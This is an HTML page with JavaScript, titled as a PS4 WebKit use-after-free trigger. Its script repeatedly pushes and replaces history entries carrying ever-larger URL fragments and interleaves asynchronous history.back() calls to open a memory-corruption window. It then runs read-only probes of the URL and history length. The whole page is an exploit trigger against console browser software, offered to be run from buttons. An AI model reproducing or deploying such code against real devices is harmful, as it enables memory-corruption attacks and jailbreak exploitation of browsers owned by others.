<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Original UAF Trigger (A/B/C)</title>
<style>
body {
    background:#000;
    color:#0f0;
    font-family: monospace;
    padding: 16px;
}
button {
    margin: 4px;
    padding: 8px;
}
pre {
    white-space: pre-wrap;
}
</style>
</head>
<body>

<h2>PS4 WebKit – Original UAF Trigger</h2>

<button onclick="runTest('A')">Run A</button>
<button onclick="runTest('B')">Run B</button>
<button onclick="runTest('C')">Run C</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ======================================================
   ORIGINAL UAF TRIGGER — DO NOT MODIFY
   ====================================================== */
async function triggerUAF(char){
    let size = 977;
    const STEP = 14461;

    log("=== START ===");

    for(let i=0;i<48;i++){
        let frag = char.repeat(size);

        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        log("[ITER "+i+"] frag_len="+size);

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(" history.back() ASYNC");
        }

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

/* ======================================================
   POST-UAF PROBES (SAFE)
   ====================================================== */
function postUAFProbe(tag){
    log("--- POST-UAF PROBE ---");
    try{
        log("document.URL.length = " + document.URL.length);
        log("URL.includes("+tag+tag+tag+tag+") = " +
            document.URL.includes(tag.repeat(4)));
        log("history.length = " + history.length);
    }catch(e){
        log("probe exception: " + e);
    }
    log("--- END PROBE ---");
}

/* ======================================================
   ENTRY
   ====================================================== */
async function runTest(mode){
    logEl.textContent = "";
    log("=== RUN MODE "+mode+" ===");
    await triggerUAF(mode);
    postUAFProbe(mode);
    log("=== END MODE "+mode+" ===");
}
</script>

</body>
</html>

